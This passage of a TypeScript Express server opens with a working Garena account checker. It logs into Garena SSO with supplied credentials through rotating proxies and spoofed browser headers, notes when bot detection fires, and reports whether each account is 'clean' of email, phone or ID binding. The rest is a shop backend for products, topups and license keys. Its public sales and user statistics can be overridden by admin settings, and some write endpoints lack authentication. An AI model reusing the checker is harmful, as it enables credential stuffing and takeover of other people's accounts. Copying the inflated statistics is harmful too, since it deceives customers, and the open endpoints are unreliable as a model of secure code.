          const ddCookieParts = fallbackDdRes.data.cookie.split(';');
          const ddCookieValue = ddCookieParts[0];
          await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
        }

        preloginRes = await directClient.get('https://sso.garena.com/api/prelogin', {
          params: { app_id: '10100', account, format: 'json', id: Date.now() },
          headers: {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
          }
        });
        
        if (preloginRes.status === 403) {
           return res.json({ success: false, error: 'ระบบ Garena ป้องกันการเข้าถึงบัญชี (403) แนะนำให้เปลี่ยน Proxy หรือหยุดพัก' });
        }
      }

      const { v1, v2, error: preError } = preloginRes.data;
      if (preError) return res.json({ success: false, error: `Account Error: ${preError}` });
      if (!v1 || !v2) {
        console.error("Prelogin Debug Data:", JSON.stringify(preloginRes.data));
        if (preloginRes.data && (preloginRes.data.captcha || (preloginRes.data.url && preloginRes.data.url.includes('captcha')))) {
          return res.json({ success: false, error: 'ระบบตรวจพบโปรแกรมอัตโนมัติ (DataDome / Captcha). กรุณาเปลี่ยน Proxy' });
        }
        return res.json({ success: false, error: 'Challenge failed (Empty v1/v2). Garena structure might have changed.' });
      }

      // 3. SSO Login Attempt
      console.log('--- Calling SSO Login ---');
      const hashedPassword = encryptPassword(password, v1, v2);
      const activeClient = usedDirectClient ? directClient : client;
      
      const loginRes = await activeClient.get('https://sso.garena.com/api/login', {
        params: {
          app_id: '10100', account, password: hashedPassword,
          redirect_uri: 'https://account.garena.com/',
          format: 'json', id: Date.now()
        },
        headers: {
          'accept': 'application/json, text/plain, */*',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'user-agent': randomUserAgent
        }
      });
      console.log('--- Login Done ---');

      const loginData = loginRes.data;
      if (loginData.error) {
        const errorMsg = loginData.error === 'error_auth' ? 'รหัสผ่านผิด' : 
                        loginData.error === 'error_not_exist' ? 'ไม่พบไอดีนี้' : 
                        loginData.error;
        return res.json({ success: false, error: errorMsg });
      }

      // 4. Successful Login - Fetch Info
      console.log('--- Calling Account Init ---');
      const initRes = await activeClient.get('https://account.garena.com/api/account/init', {
        headers: { 
          'accept': '*/*',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'user-agent': randomUserAgent
        }
      });
      console.log('--- Account Init Done ---');      
      const resData = initRes.data || {};
      const userData = resData.user_info || resData || {};
      
      const binds = [];
      if (userData.email && userData.email !== 'N/A') binds.push('Email');
      if (userData.mobile_no && userData.mobile_no !== 'N/A') binds.push('Phone');
      if (userData.is_fbconnect_enabled) binds.push('Facebook');
      if (userData.idcard && userData.idcard !== 'N/A') binds.push('ID Card');
      
      const isClean = binds.length === 0;

      // 5. Fetch CODM & Game Info
      const [codmInfo, gameConnections] = await Promise.all([
        getCodmInfo(activeClient),
        getGameConnections(activeClient)
      ]);

      const rovGames = (gameConnections || []).filter((g: string) => g.toUpperCase().includes('ROV'));
      const hasRov = rovGames.length > 0;
      let rovCharacter = 'N/A';
      if (hasRov) {
        try {
          const cleanName = rovGames[0].replace('[', '').replace(']', '');
          const parts = cleanName.split('-');
          if (parts.length > 2) rovCharacter = parts[2].trim();
        } catch(e) {}
      }
      const phoneBound = !!(userData.mobile_no && userData.mobile_no !== 'N/A');
      const emailVerified = !!userData.email_v;
      const rovClean = hasRov && !emailVerified && !phoneBound;
      const hasCodm = codmInfo != null && codmInfo.level !== 'Unknown';

      return res.json({
        success: true,
        data: {
          account, password, uid: userData.uid || 'N/A',
          shells: userData.shell || 0,
          level: codmInfo?.level || 0, 
          rank: 'Success', 
          isClean,
          phoneBound,
          emailVerified,
          fbLinked: !!userData.is_fbconnect_enabled,
          region: userData.acc_country || 'TH',
          otherGames: gameConnections || [],
          codmNickname: codmInfo?.nickname || 'N/A',
          idCardBound: !!(userData.idcard && userData.idcard !== 'N/A'),
          hasRov,
          rovCharacter,
          rovClean,
          hasCodm
        }
      });

    } catch (err: any) {
      const errMsg = err?.message || '';
      if (!['ECONNREFUSED', 'canceled', 'CanceledError', 'AbortError'].some(e => errMsg.includes(e) || err?.name === e || err?.code === e)) {
         console.error("Garena API Error:", errMsg || err);
      }
      let errorMsg = 'Network Error: ' + (errMsg || 'Unknown Error');
      
      if (err?.code === 'ECONNABORTED' || errMsg.includes('timeout') || err?.code === 'ETIMEDOUT') {
        errorMsg = 'การเชื่อมต่อหมดเวลา (Timeout). อาจเกิดจาก Proxy ช้าหรือใช้งานไม่ได้ (ภายใน 30 วินาที)';
      } else if (err?.name === 'AbortError' || err?.code === 'ERR_CANCELED' || err?.name === 'CanceledError' || errMsg === 'canceled') {
        errorMsg = 'การเชื่อมต่อถูกยกเลิก (ใช้เวลาเกิน 90 วินาที). Proxy ช้าเกินไป หรือค้าง';
      } else if (err?.code === 'ECONNRESET') {
        errorMsg = 'การเชื่อมต่อถูกตัด (ECONNRESET). โปรดเปลี่ยน Proxy หรือลองใหม่อีกครั้ง';
      } else if (errMsg.includes('disconnected') || errMsg.includes('TLS')) {
        errorMsg = 'ไม่สามารถสร้างการเชื่อมต่อที่ปลอดภัย (TLS Error). Proxy นี้อาจไม่รองรับ HTTPS หรือถูกบล็อก';
      } else if (err?.code === 'ECONNREFUSED' || errMsg.includes('ECONNREFUSED')) {
        errorMsg = 'เชื่อมต่อล้มเหลว (ECONNREFUSED). เซิร์ฟเวอร์ Proxy ออฟไลน์หรือไม่สามารถติดต่อได้';
      } else if (errMsg.includes('CONNECT response')) {
        errorMsg = 'การเชื่อมต่อถูกตัดตอนเชื่อมต่อกับ Proxy (Proxy connection ended). กรุณาลองทดสอบอีกครั้ง หรือเปลี่ยน Proxy';
      }
      
      return res.json({ success: false, error: errorMsg, isProxyError: true });
    }
  });

  // --- Supabase Proxy Routes ---
  // --- Products Endpoints ---
  app.get('/api/products', async (req: any, res: any) => {
    try {
      const snapshot = await admin.firestore().collection('products').get();
      const data = snapshot.docs.map(doc => {
        const item = { id: doc.id, ...doc.data() } as any;
        if (!req.isAdmin) {
          delete item.stockData;
        }
        return item;
      });
      res.json(data);
    } catch (err: any) {
      console.error('PROD ERR OBJ:', JSON.stringify(err, Object.getOwnPropertyNames(err)));
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/products', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const product = req.body;
      const { id, ...dataToSave } = product;
      const docRef = await admin.firestore().collection('products').add(dataToSave);
      res.json({ id: docRef.id, dbId: docRef.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error creating product:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.put('/api/products/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const product = req.body;
      const { id, ...dataToSave } = product;
      const docRef = admin.firestore().collection('products').doc(req.params.id);
      await docRef.update(dataToSave);
      res.json({ id: req.params.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error updating product:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/products/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      await admin.firestore().collection('products').doc(req.params.id).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting product:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/test_stats', async (req, res) => {
    res.json({ ok: 1 });
  });

  let cachedStats: any = null;
  let lastStatsFetch = 0;

  app.get('/api/stats', async (req, res) => {
console.log('HIT STATS ENDPOINT');
    try {
      const now = Date.now();
      if (cachedStats && now - lastStatsFetch < 600000) {
        return res.json(cachedStats);
      }

      const adminDb = admin.firestore();
      
      let totalStock = 0;
      try {
        const productsSnap = await adminDb.collection('products').get();
        productsSnap.forEach(doc => {
          const data = doc.data();
          if (data.stock > 0 && data.stock < 999999) totalStock += data.stock;
        });
      } catch (e) {
      }

      let totalSales = 0;
      let totalPurchaseOrders = 0;
      try {
        const purchasesSnap = await adminDb.collection('purchases').get();
        purchasesSnap.forEach(doc => {
          totalSales += (doc.data().price || 0);
          totalPurchaseOrders++;
        });
      } catch(e) {
      }

      let totalTopupsAmount = 0;
      try {
        const topupsSnap = await adminDb.collection('topups').get();
        topupsSnap.forEach(doc => {
          totalTopupsAmount += (doc.data().amount || 0);
        });
      } catch(e) {
      }

      let totalUsersCount = 0;
      try {
        const usersSnap = await adminDb.collection('users').get();
        totalUsersCount = usersSnap.docs.length;
      } catch(e) {
      }

      cachedStats = {
        users: siteSettings.stats_users_override !== undefined && !isNaN(siteSettings.stats_users_override) ? siteSettings.stats_users_override : totalUsersCount + (siteSettings.stats_users_offset || 0),
        sales: siteSettings.stats_sales_override !== undefined && !isNaN(siteSettings.stats_sales_override) ? siteSettings.stats_sales_override : totalSales + (siteSettings.stats_sales_offset || 0),
        stock: siteSettings.stats_stock_override !== undefined && !isNaN(siteSettings.stats_stock_override) ? siteSettings.stats_stock_override : totalStock,
        totalOrders: totalPurchaseOrders,
        totalTopupsAmount
      };
      
      if (totalUsersCount > 0 || totalPurchaseOrders > 0 || totalStock > 0 || totalTopupsAmount > 0) {
         lastStatsFetch = now;
      }
      
      res.json(cachedStats);
    } catch (err: any) {
      console.error('STATS ERROR:', err);
      // Fallback
      res.json(cachedStats || {
        users: siteSettings.stats_users_offset || 0,
        sales: siteSettings.stats_sales_offset || 0,
        stock: 0,
        totalOrders: 0,
        totalTopupsAmount: 0
      });
    }
  });

  // --- Purchases Endpoints ---
  app.get('/api/purchases', async (req: any, res: any) => {
    try {
      const adminDb = admin.firestore();
      let q: any = adminDb.collection('purchases');
      if (req.isAdmin) {
        q = q.orderBy('date', 'desc').limit(100);
      } else if (req.user) {
        q = q.where('userId', '==', req.user.uid).orderBy('date', 'desc').limit(100);
      } else {
        return res.json([]);
      }
      const snapshot = await q.get();
      const data = snapshot.docs.map(doc => ({ dbId: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching purchases:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/purchases', async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const docRef = await admin.firestore().collection('purchases').add(data);
      res.json({ id: docRef.id, dbId: docRef.id, ...data });
    } catch (err) {
      console.error('Internal server error creating purchase:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Topups Endpoints ---
  app.get('/api/topups', async (req: any, res: any) => {
    try {
      const adminDb = admin.firestore();
      let q: any = adminDb.collection('topups');
      if (req.isAdmin) {
        q = q.orderBy('date', 'desc').limit(100);
      } else if (req.user) {
        q = q.where('userId', '==', req.user.uid).orderBy('date', 'desc').limit(100);
      } else {
        return res.json([]);
      }
      const snapshot = await q.get();
      const data = snapshot.docs.map(doc => ({ dbId: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching topups:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/topups', async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const docRef = await admin.firestore().collection('topups').add(data);
      res.json({ id: docRef.id, dbId: docRef.id, ...data });
    } catch (err) {
      console.error('Internal server error creating topup:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Categories Endpoints ---
  app.get('/api/categories', async (req, res) => {
    try {
      const snapshot = await admin.firestore().collection('categories').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching categories:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/categories', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const { id, ...dataToSave } = data;
      const docRef = await admin.firestore().collection('categories').add(dataToSave);
      res.json({ id: docRef.id, dbId: docRef.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error creating category:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.put('/api/categories/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const { id, ...dataToSave } = data;
      const docRef = admin.firestore().collection('categories').doc(req.params.id);
      await docRef.update(dataToSave);
      res.json({ id: req.params.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error updating category:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/categories/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      await admin.firestore().collection('categories').doc(req.params.id).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting category:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- Custom Pages Endpoints ---
  app.get('/api/pages', async (req, res) => {
    try {
      const snapshot = await admin.firestore().collection('custom_pages').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching pages:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/pages', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const pageData = req.body;
      const { id, ...dataToSave } = pageData;
      const docRef = await admin.firestore().collection('custom_pages').add({ ...dataToSave, created_at: new Date().toISOString() });
      res.json({ id: docRef.id, dbId: docRef.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error creating page:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.put('/api/pages/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const pageData = req.body;
      const { id, ...dataToSave } = pageData;
      const docRef = admin.firestore().collection('custom_pages').doc(req.params.id);
      await docRef.update(dataToSave);
      res.json({ id: req.params.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error updating page:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/pages/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      await admin.firestore().collection('custom_pages').doc(req.params.id).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting page:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/license_keys', async (req: any, res: any) => {
    if (!req.isAdmin) return res.json([]);
    try {
      const snapshot = await admin.firestore().collection('license_keys').orderBy('created_at', 'desc').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching license_keys:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/license_keys', requireAdmin, async (req, res) => {
    try {
      const { key, plan, status } = req.body;
      const newDoc = { key, plan, status, created_at: new Date().toISOString() };
      const docRef = await admin.firestore().collection('license_keys').add(newDoc);
      res.json({ id: docRef.id, dbId: docRef.id, ...newDoc });
    } catch (err) {
      console.error('Internal server error inserting license_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/license_keys/:id', requireAdmin, async (req, res) => {
    try {
      await admin.firestore().collection('license_keys').doc(req.params.id).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting license_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.patch('/api/license_keys/:id', requireAdmin, async (req, res) => {
    try {
      const { status } = req.body;
      const docRef = admin.firestore().collection('license_keys').doc(req.params.id);
      await docRef.update({ status });
      res.json({ id: req.params.id, status });
    } catch (err) {
      console.error('Internal server error updating license_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/license_keys/bulk', requireAdmin, async (req, res) => {
    try {
      const { keys } = req.body; // Array of { key, type, status, created_at }
      const results = [];
      for (const k of keys) {
         const docRef = await admin.firestore().collection('license_keys').add({ ...k, created_at: new Date().toISOString() });
         results.push({ id: docRef.id, ...k });
      }
      res.json(results);
    } catch (err) {
      console.error('Internal server error bulk inserting license_keys:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/validate_key/:key', async (req, res) => {
    try {
      const snapshot = await admin.firestore().collection('license_keys').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })).find((d: any) => d.key === req.params.key);
      if (!data) return res.status(404).json({ error: 'Key not found' });
      res.json(data);
    } catch (err) {
      console.error('Internal server error validating key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/used_keys', async (req: any, res: any) => {
    if (!req.isAdmin) return res.json([]);
    try {
      const snapshot = await admin.firestore().collection('used_keys').orderBy('used_at', 'desc').limit(100).get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching used_keys:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/used_keys', async (req, res) => {
    try {
      const { key, ip, details } = req.body;
      const newDoc = { key, ip, details, used_at: new Date().toISOString() };
      const docRef = await admin.firestore().collection('used_keys').add(newDoc);
      res.json({ id: docRef.id, dbId: docRef.id, ...newDoc });
    } catch (err) {
      console.error('Internal server error inserting used_key:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/blocked_ips', async (req: any, res: any) => {
    if (!req.isAdmin) return res.json([]);
    try {
      const snapshot = await admin.firestore().collection('blocked_ips').orderBy('blocked_at', 'desc').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching blocked_ips:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/blocked_ips', requireAdmin, async (req, res) => {
    try {
      const { ip, reason } = req.body;
      const newDoc = { ip, reason, blocked_at: new Date().toISOString() };
      // Note: simplistic upsert simulation using ip as doc ID
      const docRef = admin.firestore().collection('blocked_ips').doc(ip);
      await docRef.set(newDoc);
      res.json({ id: ip, ...newDoc });
    } catch (err) {
      console.error('Internal server error upserting blocked_ip:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/blocked_ips/:ip', requireAdmin, async (req, res) => {
    try {
      await admin.firestore().collection('blocked_ips').doc(req.params.ip).delete();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting blocked_ip:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/check_ip/:ip', async (req, res) => {
    try {
      const snapshot = await admin.firestore().collection('blocked_ips').get();
      const data = snapshot.docs.map(doc => doc.data()).find((d: any) => d.ip === req.params.ip);
      res.json({ blocked: !!data });
    } catch (err) {
      console.error('Internal server error checking IP:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/admins', requireAdmin, async (req: any, res: any) => {
    try {
      const { username, role } = req.body;
      const newDoc = { username, role, granted_at: new Date().toISOString() };
      const docRef = admin.firestore().collection('admins').doc(username);
      await docRef.set(newDoc);
      res.json({ id: username, ...newDoc });
    } catch (err) {
      console.error('Internal server error upserting admin:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // --- User Profiles Endpoints ---
  app.get('/api/users/:uid', requireAuth, async (req: any, res: any) => {
    if (req.user.uid !== req.params.uid && !req.isAdmin) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const docRef = admin.firestore().collection('users').doc(req.params.uid);
      const snapshot = await docRef.get();
      if (snapshot.exists) {
        res.json(snapshot.data());
      } else {
        res.status(404).json({ error: 'User not found' });
      }
    } catch (err) {
      console.error('Error fetching user:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/users/:uid', requireAuth, async (req: any, res: any) => {
    if (req.user.uid !== req.params.uid && !req.isAdmin) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const { uid } = req.params;
      const data = req.body;
      
      // Prevent privilege escalation and balance spoofing
      if (!req.isAdmin) {
        delete data.balance;
        delete data.amount;
        delete data.role;
        delete data.isPremium;
      }
      
      const docRef = admin.firestore().collection('users').doc(uid);
      await docRef.set({ ...data, updatedAt: new Date().toISOString() }, { merge: true });
      res.json({ success: true });
    } catch (err) {
      console.error('Error saving user:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/users', async (req: any, res: any) => {
    if (!req.isAdmin) return res.json([]);
    try {
      const snapshot = await admin.firestore().collection('users').get();
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Error fetching all users:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/log_error', (req, res) => {
    try {
      const safeBody = typeof req.body === 'object' ? JSON.stringify({ type: req.body.type, message: req.body.message }) : String(req.body).substring(0, 200);
      console.error('CLIENT ERROR:', safeBody);
    } catch(e) {}
    res.json({ received: true });
  });


if (!process.env.VERCEL) {
  if (process.env.NODE_ENV !== "production") {
    console.log("Initializing Vite middleware (async)...");
    import('vite').then(({ createServer: createViteServer }) => {
      return createViteServer({
        server: { middlewareMode: true, hmr: false },
        appType: "spa",
      });
    }).then(vite => {
      app.use(vite.middlewares);
      console.log("Vite middleware attached.");
      app.listen(3000, "0.0.0.0", () => {
        console.log(`[Server] Listening on http://0.0.0.0:3000`);
      });
    }).catch(err => {
      console.error("Failed to initialize Vite middleware:", err);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
    app.listen(3000, "0.0.0.0", () => {
      console.log(`[Server] Listening on http://0.0.0.0:3000`);
    });
  }
}
export default app;

